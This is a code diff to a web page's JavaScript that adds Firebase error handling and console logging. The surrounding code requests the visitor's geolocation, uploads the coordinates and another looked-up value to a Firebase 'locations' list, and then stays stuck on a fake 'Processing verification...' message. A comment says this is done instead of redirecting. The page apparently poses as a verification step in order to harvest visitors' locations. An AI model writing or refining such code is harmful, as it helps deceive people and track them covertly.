@@ -10,8 +10,19 @@ const firebaseConfig = {
 };
 
 // Initialize Firebase
-firebase.initializeApp(firebaseConfig);
-const database = firebase.database();
+try {
+    firebase.initializeApp(firebaseConfig);
+    console.log('Firebase initialized successfully');
+    const database = firebase.database();
+    console.log('Database reference created');
+
+    // Test database connection
+    database.ref('.info/connected').on('value', (snapshot) => {
+        console.log('Database connection state:', snapshot.val());
+    });
+} catch (error) {
+    console.error('Error initializing Firebase:', error);
+}
 
 // Prevent right-click on logo
 document.querySelector('.logo').addEventListener('contextmenu', (e) => {
@@ -48,6 +59,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
+                    console.log('Location obtained:', position.coords);
                     const locationData = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
@@ -60,15 +72,17 @@ document.addEventListener('DOMContentLoaded', () => {
                             .catch(() => 'Unknown')
                     };
 
+                    console.log('Attempting to save location data:', locationData);
+
                     // Save location data to Firebase
                     database.ref('locations').push(locationData)
                         .then(() => {
-                            console.log('Location saved');
+                            console.log('Location saved successfully to Firebase');
                             // Keep showing loading state instead of redirecting
                             locationStatus.textContent = 'Processing verification...';
                         })
                         .catch(error => {
-                            console.error('Error saving location:', error);
+                            console.error('Error saving location to Firebase:', error);
                             // Even on error, keep showing loading state
                             locationStatus.textContent = 'Processing verification...';
                         });
@@ -80,6 +94,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             );
         } else {
+            console.error('Geolocation not supported');
             // Keep showing loading state if geolocation not supported
             locationStatus.textContent = 'Processing verification...';
         }
